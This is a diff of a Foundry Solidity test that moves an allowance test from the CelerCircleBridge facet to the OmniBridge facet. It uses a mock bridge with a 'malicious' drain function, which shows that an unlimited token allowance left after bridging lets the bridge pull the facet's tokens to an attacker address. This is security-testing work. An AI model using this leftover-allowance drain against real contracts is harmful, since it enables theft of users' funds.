@@ -1,48 +1,45 @@
-// SPDX-License-Identifier: Unlicense
+// SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.17;
 
 import {Test} from "forge-std/Test.sol";
 import {MockERC20} from "solmate/test/utils/mocks/MockERC20.sol";
-import {CelerCircleBridgeFacet} from "lifi/Facets/CelerCircleBridgeFacet.sol";
-import {ICircleBridgeProxy} from "lifi/Interfaces/ICircleBridgeProxy.sol";
+import {OmniBridgeFacet} from "lifi/Facets/OmniBridgeFacet.sol";
+import {IOmniBridge} from "lifi/Interfaces/IOmniBridge.sol";
 import {ILiFi} from "lifi/Interfaces/ILiFi.sol";
 
-contract MockCircleBridgeProxy is ICircleBridgeProxy {
+contract MockOmniBridge is IOmniBridge {
     address public token;
 
     constructor(address _token) {
         token = _token;
     }
 
-    function depositForBurn(
-        uint256 _amount,
-        uint64,
-        bytes32,
-        address
-    ) external override returns (uint64) {
-        MockERC20(token).transferFrom(msg.sender, address(this), _amount);
-        return 0;
+    function relayTokens(
+        address _token,
+        address,
+        uint256 _amount
+    ) external override {
+        MockERC20(_token).transferFrom(msg.sender, address(this), _amount);
     }
 
-    // malicious drain function exploiting leftover allowance
+    function wrapAndRelayTokens(address) external payable override {}
+
+    // malicious function to drain tokens using remaining allowance
     function drain(address from, address to, uint256 amount) external {
         MockERC20(token).transferFrom(from, to, amount);
     }
 }
 
-contract CelerCircleBridgeFacetAllowanceTest is Test {
+contract OmniBridgeFacetAllowanceTest is Test {
     MockERC20 internal token;
-    MockCircleBridgeProxy internal bridge;
-    CelerCircleBridgeFacet internal facet;
+    MockOmniBridge internal bridge;
+    OmniBridgeFacet internal facet;
     address internal attacker = address(0xbeef);
 
     function setUp() public {
         token = new MockERC20("Mock", "MOCK", 18);
-        bridge = new MockCircleBridgeProxy(address(token));
-        facet = new CelerCircleBridgeFacet(
-            ICircleBridgeProxy(address(bridge)),
-            address(token)
-        );
+        bridge = new MockOmniBridge(address(token));
+        facet = new OmniBridgeFacet(IOmniBridge(address(bridge)), IOmniBridge(address(bridge)));
 
         token.mint(address(this), 100 ether);
         token.approve(address(facet), type(uint256).max);
@@ -57,23 +54,19 @@ contract CelerCircleBridgeFacetAllowanceTest is Test {
             sendingAssetId: address(token),
             receiver: address(0x1234),
             minAmount: 10 ether,
-            destinationChainId: 1,
+            destinationChainId: 2,
             hasSourceSwaps: false,
             hasDestinationCall: false
         });
 
-        facet.startBridgeTokensViaCelerCircleBridge(bridgeData);
+        facet.startBridgeTokensViaOmniBridge(bridgeData);
 
-        // allowance remains set after bridging
-        assertEq(
-            token.allowance(address(facet), address(bridge)),
-            type(uint256).max
-        );
+        assertEq(token.allowance(address(facet), address(bridge)), type(uint256).max);
 
-        // attacker sends tokens to facet and bridge drains them
         token.mint(address(facet), 5 ether);
         bridge.drain(address(facet), attacker, 5 ether);
 
         assertEq(token.balanceOf(attacker), 5 ether);
     }
 }
+
